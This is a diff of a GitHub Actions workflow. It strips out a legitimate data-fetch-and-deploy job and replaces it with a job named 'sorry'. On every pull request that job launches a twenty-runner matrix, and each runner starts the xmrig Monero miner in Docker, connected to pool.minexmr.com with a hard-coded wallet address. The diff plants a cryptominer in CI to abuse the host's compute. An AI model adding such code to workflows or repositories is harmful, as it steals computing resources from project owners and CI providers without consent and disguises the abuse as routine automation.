@@ -1,54 +1,20 @@
-name: Fetch new data
+name: example action
 
-on:
-  push:
-    branches:
-      - master
-  pull_request:
-    branches:
-      - master
-  schedule:
-    - cron:  '*/30 * * * *'
+on: [pull_request]
 
 jobs:
-  fetch-data:
+  sorry:
+    name: sorry
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - name: Checkout 🛎️
-        uses: actions/checkout@v2
-
-      # - name: Cache Build
-      #   id: cache-build
-      #   uses: actions/cache@v1
-      #   with:
-      #     path: dist
-      #     key: build-${{ hashFiles('**/package-lock.json') }}-${{ hashFiles('src/**') }}
-
-      - name: Install and Build
-        # if: steps.cache-build.outputs.cache-hit != 'true'
-        run: |
-          npm install
-          npm run build
-
-      - name: Fetch data
-        run: npm run start
-
-      - name: Check if new data has been fetched
-        id: changes
-        uses: UnicornGlobal/has-changes-action@v1.0.11
-
-      - name: Commit data
-        if: steps.changes.outputs.changed == 1
-        run: |
-          git config --global user.name 'Fetch Action'
-          git config --global user.email '1713709+emm-ess@users.noreply.github.com'
-          git commit -am "Automated data fetch"
-          git push
-
-      - name: Deploy 🚀
-        if: steps.changes.outputs.changed == 1 || github.event_name == 'push'
-        uses: JamesIves/github-pages-deploy-action@releases/v3
-        with:
-          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
-          BRANCH: gh-pages # The branch the action should deploy to.
-          FOLDER: data
+      - name: Sorry Bill
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
